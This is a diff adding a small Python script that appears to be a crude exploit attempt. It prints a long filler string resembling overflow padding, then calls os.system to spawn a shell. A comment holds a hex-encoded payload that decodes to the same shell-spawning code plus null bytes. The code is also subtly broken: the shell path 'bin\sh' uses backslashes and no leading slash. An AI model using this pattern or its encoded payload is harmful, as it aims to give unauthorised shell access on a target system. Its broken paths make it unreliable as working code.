@@ -1,0 +1,6 @@
+#!/usr/bin/python
+import os
+print("blahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblah")
+os.system("bin\sh")
+
+#$(python -c 'print("\x23\x21\x20\x62\x69\x6e\x5c\x73\x68\x5c\x70\x79\x74\x68\x6f\x6e" + "\x0d\x0a\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0d\x0a\x0d" + "\x0a\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x62\x69\x6e\x5c" + "\x73\x68\x22\x29\x00\x00\x00\x00")')
